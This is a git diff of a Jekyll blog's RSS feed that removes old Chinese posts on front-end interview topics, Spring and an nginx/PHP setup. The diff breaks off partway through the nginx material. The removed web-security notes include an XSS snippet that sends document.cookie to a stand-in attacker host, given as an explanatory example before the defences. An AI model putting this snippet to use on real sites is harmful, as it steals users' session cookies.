@@ -2,2395 +2,108 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title></title>
-    <description>Some words wanna say</description>
+    <description>语文 英语 奥数 物理 化学 【中小学文化辅导 + 绘画 + 书法】</description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 18 Aug 2017 16:12:38 +0800</pubDate>
-    <lastBuildDate>Fri, 18 Aug 2017 16:12:38 +0800</lastBuildDate>
+    <pubDate>Fri, 18 Aug 2017 20:09:35 +0800</pubDate>
+    <lastBuildDate>Fri, 18 Aug 2017 20:09:35 +0800</lastBuildDate>
     <generator>Jekyll v3.5.0</generator>
     
       <item>
-        <title>fe</title>
+        <title>孩子沉迷手机？</title>
         <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#css盒子模型&quot; id=&quot;markdown-toc-css盒子模型&quot;&gt;css盒子模型&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#css未知宽高元素水平垂直居中&quot; id=&quot;markdown-toc-css未知宽高元素水平垂直居中&quot;&gt;CSS未知宽高元素水平垂直居中&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#绑定事件的方式&quot; id=&quot;markdown-toc-绑定事件的方式&quot;&gt;绑定事件的方式&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#类原型对象构造函数&quot; id=&quot;markdown-toc-类原型对象构造函数&quot;&gt;类、原型对象、构造函数&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#this-指针&quot; id=&quot;markdown-toc-this-指针&quot;&gt;this 指针&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#cmd-amd-es6-模块规范&quot; id=&quot;markdown-toc-cmd-amd-es6-模块规范&quot;&gt;cmd amd es6 模块规范&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#http-http1x-https-http20-websocket&quot; id=&quot;markdown-toc-http-http1x-https-http20-websocket&quot;&gt;http http1.x https http2.0 websocket&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#web安全&quot; id=&quot;markdown-toc-web安全&quot;&gt;web安全&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;css盒子模型&quot;&gt;css盒子模型&lt;/h3&gt;
-
-&lt;p&gt;盒子模型包括外边距（margin）、边框（border）、内边距（padding）、内容（content）四个属性。&lt;/p&gt;
-
-&lt;p&gt;content为image，或文字，或包含小的盒子。&lt;/p&gt;
-
-&lt;p&gt;CSS盒子具有弹性，会自适应。&lt;/p&gt;
-
-&lt;p&gt;W3C标准盒子 = (边框 + 填充 + 内容块大小)。&lt;/p&gt;
-
-&lt;p&gt;box-sizing:border-box  width属性为边框 + 填充 + 内容块大小&lt;/p&gt;
-
-&lt;p&gt;box-sizing:content-box  width属性为内容块大小&lt;/p&gt;
-
-&lt;p&gt;inline元素声明margin-top和margin-bottom没有效果&lt;/p&gt;
-
-&lt;h3 id=&quot;css未知宽高元素水平垂直居中&quot;&gt;CSS未知宽高元素水平垂直居中&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;方法一&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;思路：显示设置父元素为：table，子元素为：cell-table，这样就可以使用vertical-align: center，实现水平居中&lt;/p&gt;
-
-&lt;p&gt;优点：父元素（parent）可以动态的改变高度（table元素的特性）&lt;/p&gt;
-
-&lt;p&gt;缺点：IE8以下不支持，增加html复杂性&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;方法二&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;思路：子元素绝对定位，距离顶部 50%，左边50%，然后使用css3 transform:translate(-50%; -50%)&lt;/p&gt;
-
-&lt;p&gt;优点：高大上,可以在webkit内核的浏览器中使用&lt;/p&gt;
-
-&lt;p&gt;缺点：不支持IE9以下不支持transform属性&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;方法三&lt;/strong&gt;
-思路：使用css3 flex布局
-优点：简单 快捷
-缺点：兼容不好&lt;/p&gt;
-
-&lt;h3 id=&quot;绑定事件的方式&quot;&gt;绑定事件的方式&lt;/h3&gt;
-
-&lt;p&gt;在DOM元素中直接绑定&lt;/p&gt;
-
-&lt;p&gt;在JavaScript代码中绑定 onclick=function 方式&lt;/p&gt;
-
-&lt;p&gt;绑定事件监听函数 用addEventListener() 或 attachEvent() 来绑定事件监听函数。&lt;/p&gt;
-
-&lt;h3 id=&quot;类原型对象构造函数&quot;&gt;类、原型对象、构造函数&lt;/h3&gt;
-
-&lt;p&gt;面向对象，js中不存在类的概念，js不是基于类，而是通过构造函数(constructor)和原型链（propotype chains）实现的&lt;/p&gt;
-
-&lt;p&gt;构造函数的特点：&lt;/p&gt;
-
-&lt;p&gt;构造函数的首字母必须大写，用来区分于普通函数&lt;/p&gt;
-
-&lt;p&gt;内部使用的this对象，来指向即将要生成的实例对象&lt;/p&gt;
-
-&lt;p&gt;使用New来生成实例对象&lt;/p&gt;
-
-&lt;p&gt;构造函数的缺点：&lt;/p&gt;
-
-&lt;p&gt;所有的实例对象都可以继承构造器函数中的属性和方法(包括构造函数里的prototype)。但是，同一个对象实例之间，无法共享属性，所以对于方法来说，如果定义在构造函数里会造成多个实例创建多个方法，浪费内存空间&lt;/p&gt;
-
-&lt;p&gt;解决思路：&lt;/p&gt;
-
-&lt;p&gt;所有实例都会通过原型链引用到prototype&lt;/p&gt;
-
-&lt;p&gt;prototype相当于特定类型所有实例都可以访问到的一个公共容器&lt;/p&gt;
-
-&lt;p&gt;那么我们就将重复的东西放到公共容易就好了&lt;/p&gt;
-
-&lt;p&gt;propotype属性的作用&lt;/p&gt;
-
-&lt;p&gt;js中每个数据类型都是对象，除了null 和 undefined（这个可以参考另一篇将null 和 undefined的博客）,而每个对象都是继承自一个原型对象，只有null除外，它没有自己的原型对象，最终的Objec的原型为null&lt;/p&gt;
-
-&lt;p&gt;JS中万物都是对象，但是对象也分为：普通对象和函数对象，也就是Object 和 Function.&lt;/p&gt;
-
-&lt;p&gt;那么怎么区分普通对象和函数对象呢？ —凡是通过New Function()创建的对象都是函数对象，其他的都是普通对象.&lt;/p&gt;
-
-&lt;p&gt;需要注意的是：普通对象没有propotype（prototype即是属性也是对象），但是有__proto__属性。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;js创建对象的时候都有一个__propo__内置属性，用于指向创建它的函数对象的原型对象prototype。&lt;/strong&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;this-指针&quot;&gt;this 指针&lt;/h3&gt;
-
-&lt;p&gt;它代表函数运行时，自动生成的一个内部对象，只能在函数内部使用。&lt;/p&gt;
-
-&lt;p&gt;一个总的原则，那就是this指的是，调用函数的那个对象。&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;全局函数调用，指向window或global&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;对象方法调用，指向上级对象。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;作为构造函数调用，指向这个对象&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;apply调用 它的作用是改变函数的调用对象，它的第一个参数就表示改变后的调用这个函数的对象。因此，this指的就是这第一个参数。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;箭头函数this&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;h3 id=&quot;cmd-amd-es6-模块规范&quot;&gt;cmd amd es6 模块规范&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;CommonJS 规范&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// 一下为一个完整模块定义
-{
-  id: '...',
-  exports: { ... },
-  loaded: true,
-  ...
-}
-
-// math.js
-exports.add = function(a, b) {
-  return a + b;
-}
-
-var math = require('math');
-math.add(2, 3); // 5
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;cmd规范里require是一个同步读取本地磁盘js过程，不适合浏览器的下载&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;AMD 规范&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;AMD是”Asynchronous Module Definition”的缩写，即”异步模块定义”。调用格式为：&lt;code class=&quot;highlighter-rouge&quot;&gt;require([module], callback);&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;模块书写必须使用特定的define()函数来定义 &lt;code class=&quot;highlighter-rouge&quot;&gt;define(id?, dependencies?, factory);&lt;/code&gt; AMD是依赖前置的。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;CMD 规范&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;CMD推崇依赖就近，延迟执行。可以把依赖写进代码的任意一行。&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;define(function(require, exports, module) {
-  var a = require('./a');
-  a.doSomething();
-  var b = require('./b');
-  b.doSomething();
-})
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;&lt;strong&gt;ES6&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;es6通过import、export实现模块的输入输出。其中import命令用于输入其他模块提供的功能，export命令用于规定模块的对外接口。&lt;/p&gt;
-
-&lt;h3 id=&quot;http-http1x-https-http20-websocket&quot;&gt;http http1.x https http2.0 websocket&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;http&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;HTTP是建立在TCP协议之上，所以HTTP协议的瓶颈及其优化技巧都是基于TCP协议本身的特性，例如tcp建立连接的3次握手和断开连接的4次挥手以及每次建立连接带来的RTT延迟时间。&lt;/p&gt;
-
-&lt;p&gt;带宽：如果说我们还停留在拨号上网的阶段，带宽可能会成为一个比较严重影响请求的问题，但是现在网络基础建设已经使得带宽得到极大的提升，我们不再会担心由带宽而影响网速，那么就只剩下延迟了。&lt;/p&gt;
-
-&lt;p&gt;延迟：浏览器阻塞（HOL blocking）：浏览器会因为一些原因阻塞请求。浏览器对于同一个域名，同时只能有 4 个连接（这个根据浏览器内核不同可能会有所差异），超过浏览器最大连接数限制，后续请求就会被阻塞。&lt;/p&gt;
-
-&lt;p&gt;DNS 查询（DNS Lookup）：浏览器需要知道目标服务器的 IP 才能建立连接。将域名解析为 IP 的这个系统就是 DNS。这个通常可以利用DNS缓存结果来达到减少这个时间的目的。
- 建立连接（Initial connection）：HTTP 是基于 TCP 协议的，浏览器最快也要在第三次握手时才能捎带 HTTP 请求报文，达到真正的建立连接，但是这些连接无法复用会导致每次请求都经历三次握手和慢启动。三次握手在高延迟的场景下影响较明显，慢启动则对文件类大请求影响较大。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;HTTP1.0和HTTP1.1的一些区别：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;缓存处理，在HTTP1.0中主要使用header里的If-Modified-Since,Expires来做为缓存判断的标准，HTTP1.1则引入了更多的缓存控制策略例如Entity tag，If-Unmodified-Since, If-Match, If-None-Match等更多可供选择的缓存头来控制缓存策略。&lt;/p&gt;
-
-&lt;p&gt;带宽优化及网络连接的使用，HTTP1.0中，存在一些浪费带宽的现象，例如客户端只是需要某个对象的一部分，而服务器却将整个对象送过来了，并且不支持断点续传功能，HTTP1.1则在请求头引入了range头域，它允许只请求资源的某个部分，即返回码是206（Partial Content），这样就方便了开发者自由的选择以便于充分利用带宽和连接。&lt;/p&gt;
-
-&lt;p&gt;错误通知的管理，在HTTP1.1中新增了24个错误状态响应码，如409（Conflict）表示请求的资源与资源的当前状态发生冲突；410（Gone）表示服务器上的某个资源被永久性的删除。&lt;/p&gt;
-
-&lt;p&gt;Host头处理，在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。&lt;/p&gt;
-
-&lt;p&gt;长连接，HTTP 1.1支持长连接（PersistentConnection）和请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，在HTTP1.1中默认开启Connection： keep-alive，一定程度上弥补了HTTP1.0每次请求都要创建连接的缺点。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;https&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;http = tcp + http协议
-https = http + ssl&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;HTTP2.0的新特性&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;新的二进制格式（Binary Format），HTTP1.x的解析是基于文本。基于文本协议的格式解析存在天然缺陷，文本的表现形式有多样性，要做到健壮性考虑的场景必然很多，二进制则不同，只认0和1的组合。基于这种考虑HTTP2.0的协议解析决定采用二进制格式，实现方便且健壮。&lt;/p&gt;
-
-&lt;p&gt;多路复用（MultiPlexing），即连接共享，即每一个request都是是用作连接共享机制的。一个request对应一个id，这样一个连接上可以有多个request，每个连接的request可以随机的混杂在一起，接收方可以根据request的 id将request再归属到各自不同的服务端请求里面。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;websocket&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;WebSocket是基于HTTP1.1的协议，可以简单理解为创建了一条TCP连接，具有双向传输二进制等特性。而HTTP2.0则是对HTML、CSS等JS资源的传输方式进行了优化，并没有提供新的JS API，也不能用于实时传输消息。&lt;/p&gt;
-
-&lt;h3 id=&quot;web安全&quot;&gt;web安全&lt;/h3&gt;
-
-&lt;p&gt;&lt;strong&gt;DoS和DDoS攻击&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;伪造大量不存在的ip发送请求给服务器，服务器三步握手时收不到回应会有个长时间的半连接状态，消耗大量资源。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;CSRF攻击&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;b网站利用已登录a网站的cookie，发送恶意请求道a网站&lt;/p&gt;
-
-&lt;p&gt;Anti-CSRF-Token防御 即发送请求时在HTTP 请求中以参数的形式加入一个随机产生的token，并在服务器建立一个拦截器来验证这个token。服务器读取浏览器当前域cookie中这个token值，会进行校验该请求当中的token和cookie当中的token值是否都存在且相等，才认为这是合法的请求&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;XSS攻击&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;跨站脚本攻击，XSS跨站脚本攻击本身对Web服务器没有直接的危害，它借助网站进行传播，使网站上大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意URL，当受害者在Web中打开该URL的时候，恶意脚本会在受害者的计算机上悄悄执行。&lt;/p&gt;
-
-&lt;p&gt;如下制造出一个链接：&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vari=document.createElement(&quot;img&quot;);
-document.body.appendChild(i);
-i.src = &quot;http://www.hackerserver.com/?c=&quot; + document.cookie;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;防范措施&lt;/p&gt;
-
-&lt;p&gt;输入过滤，在PHP中，有htmlentities()和htmlspecialchars()两个函数可以满足安全要求。相应的JavaScript的编码方式可以使用JavascriptEncode。&lt;/p&gt;
-
-&lt;p&gt;HttpOnly Cookie&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;SQL注入攻击&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;SQL注入常见的注入方式有：
-(1) 内联SQL注入。向查询注入一些SQL代码后，原来的查询仍然会全部执行。内联SQL注入包含字符串内联SQL注入和数字内联SQL注入。
-(2) 终止式SQL注入。攻击者在注入SQL代码时，通过注释剩下的查询来成功结束该语句。&lt;/p&gt;
-
-&lt;p&gt;对于SQL注入攻击，我们可以做如下防范：
-(1) 防止系统敏感信息泄露。设置php.ini选项display_errors=off，防止php脚本出错之后，在web页面输出敏感信息错误，让攻击者有机可乘。
-(2) 数据转义。设置php.ini选项magic_quotes_gpc=on，它会将提交的变量中所有的’(单引号)，”(双引号)，(反斜杠)，空白字符等都在前面自动加上\。或者采用mysql_real_escape()函数或addslashes()函数进行输入参数的转义。
-(3) 增加黑名单或者白名单验证。白名单验证一般指，检查用户输入是否是符合预期的类型、长度、数值范围或者其他格式标准。黑名单验证是指，若在用户输入中，包含明显的恶意内容则拒绝该条用户请求。在使用白名单验证时，一般会配合黑名单验证。&lt;/p&gt;
-</description>
-        <pubDate>Fri, 18 Aug 2017 08:09:01 +0800</pubDate>
-        <link>http://localhost:4000/2017/08/18/fe/</link>
-        <guid isPermaLink="true">http://localhost:4000/2017/08/18/fe/</guid>
-        
-        <category>总结</category>
-        
-        
-        <category>document</category>
-        
-      </item>
-    
-      <item>
-        <title>spring</title>
-        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#gradle&quot; id=&quot;markdown-toc-gradle&quot;&gt;gradle&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#maven&quot; id=&quot;markdown-toc-maven&quot;&gt;maven&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#ide&quot; id=&quot;markdown-toc-ide&quot;&gt;IDE&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#restfule&quot; id=&quot;markdown-toc-restfule&quot;&gt;RESTFULE&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;将lnmp都编译安装到用户路径下&lt;/p&gt;
-
-&lt;h3 id=&quot;gradle&quot;&gt;gradle&lt;/h3&gt;
-&lt;p&gt;gradle默认下载解压到$HOME/.gradle&lt;/p&gt;
-
-&lt;h3 id=&quot;maven&quot;&gt;maven&lt;/h3&gt;
-&lt;p&gt;maven默认下载解压到$HOME/.m2&lt;/p&gt;
-
-&lt;h3 id=&quot;ide&quot;&gt;IDE&lt;/h3&gt;
-
-&lt;p&gt;可使用编辑器IntelliJ IDEA.&lt;/p&gt;
-
-&lt;h3 id=&quot;restfule&quot;&gt;RESTFULE&lt;/h3&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;errNum&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;errMessage&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET FROM DB SUCCESS&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;currentPage&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;totalPage&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;pageData&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;58481&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Ya: title1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;58482&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Ya: title2&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-</description>
-        <pubDate>Thu, 17 Aug 2017 08:42:01 +0800</pubDate>
-        <link>http://localhost:4000/2017/08/17/spring/</link>
-        <guid isPermaLink="true">http://localhost:4000/2017/08/17/spring/</guid>
-        
-        <category>教程</category>
-        
-        
-        <category>document</category>
-        
-      </item>
-    
-      <item>
-        <title>lnmp</title>
-        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#nginx安装&quot; id=&quot;markdown-toc-nginx安装&quot;&gt;nginx安装&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#php安装&quot; id=&quot;markdown-toc-php安装&quot;&gt;php安装&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;将lnmp都编译安装到用户路径下&lt;/p&gt;
-
-&lt;h3 id=&quot;nginx安装&quot;&gt;nginx安装&lt;/h3&gt;
-
-&lt;p&gt;下载源码：&lt;a href=&quot;https://nginx.org/download/nginx-1.11.10.tar.gz&quot;&gt;nginx源码&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;nginx编译依赖pcre，zlib，并且要指定源码路径（会从源码路径寻找makefile）&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tar xzvf nginx-1.11.10.tar.gz
-cd nginx-1.11.10
-./configure --prefix=$HOME/local/nginx --with-pcre=$HOME/opt/pcre-8.38 --with-openssl=$HOME/local/openssl --with-zlib=$HOME/opt/zlib-1.2.11
-make &amp;amp;&amp;amp; make install
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;配置nginx&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;使用include vhosts站点配置方式&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#user  nobody;
-worker_processes  1;
-error_log  logs/error.log;
-#error_log  logs/error.log  notice;
-#error_log  logs/error.log  info;
-pid        logs/nginx.pid;
-events {
-    worker_connections  1024;
-}
-# load modules compiled as Dynamic Shared Object (DSO)
-#
-#dso {
-#    load ngx_http_fastcgi_module.so;
-#    load ngx_http_rewrite_module.so;
-#}
-http {
-    include       mime.types;
-    default_type  application/octet-stream;
-    log_format  main  '$remote_addr - $remote_user [$time_local] &quot;$request&quot; '
-                      '$status $body_bytes_sent &quot;$http_referer&quot; '
-                      '&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;';
-    #access_log  logs/access.log  main;
-    sendfile        on;
-    #tcp_nopush     on;
-    #keepalive_timeout  0;
-    keepalive_timeout  65;
-    #gzip  on;
-    # server {
-         #listen       80;
-         #server_name  localhost;
-
-         #charset koi8-r;
-
-         #access_log  logs/host.access.log  main;
-
-         #location / {
-         #   root   html;
-         #   index  index.html index.htm;
-         #}
-
-         #error_page  404              /404.html;
-
-         # redirect server error pages to the static page /50x.html
-
-         #error_page   500 502 503 504  /50x.html;
-         #location = /50x.html {
-         #    root   html;
-         #}
-
-         # proxy the PHP scripts to Apache listening on 127.0.0.1:80
-         #
-         #location ~ \.php$ {
-         #    proxy_pass   http://127.0.0.1;
-         #}
-
-         # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
-         #
-         #location ~ \.php$ {
-         #    root           html;
-         #    fastcgi_pass   127.0.0.1:9000;
-         #    fastcgi_index  index.php;
-         #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;
-         #    include        fastcgi_params;
-         #}
-
-         # deny access to .htaccess files, if Apache's document root
-         # concurs with nginx's one
-         #
-         #location ~ /\.ht {
-         #    deny  all;
-         #}
-    #}
-
-    # another virtual host using mix of IP-, name-, and port-based configuration
-    #
-    #server {
-    #    listen       8000;
-    #    listen       somename:8080;
-    #    server_name  somename  alias  another.alias;
-    #    location / {
-    #        root   html;
-    #        index  index.html index.htm;
-    #    }
-    #}
-
-    # HTTPS server
-    #
-    #server {
-    #    listen       443 ssl;
-    #    server_name  localhost;
-    #    ssl_certificate      cert.pem;
-    #    ssl_certificate_key  cert.key;
-    #    ssl_session_cache    shared:SSL:1m;
-    #    ssl_session_timeout  5m;
-    #    ssl_ciphers  HIGH:!aNULL:!MD5;
-    #    ssl_prefer_server_ciphers  on;
-    #    location / {
-    #        root   html;
-    #        index  index.html index.htm;
-    #    }
-    #}
-
-    include vhosts/*.conf;
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;站点配置&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server {
-    listen  8089;
-    server_name www.test.com localhost;
-
-    charset  utf-8;
-    access_log  /home/users/caojian02/web/logs/www.test.com/access.log;
-    error_log  /home/users/caojian02/web/logs/www.test.com/error.log;
-
-    root /home/users/caojian02/web/webroot/www.test.com/public;
-    index index.php index.html index.htm;
-
-    try_files $uri $uri/ @rewrite;    
-    location @rewrite {    
-        rewrite ^/(.*)$ /index.php?_url=/$1;    
-    }      
-
-    location ~ \.php$ {
-	fastcgi_pass   127.0.0.1:9000;
-        fastcgi_index  index.php;
-        fastcgi_split_path_info  ^(.+\.php)(/.+)$;
-        fastcgi_param  SCRIPT_FILENAME  /home/users/caojian02/web/webroot/www.test.com/www$fastcgi_script_name;
-        include        fastcgi_params;
-    }
-
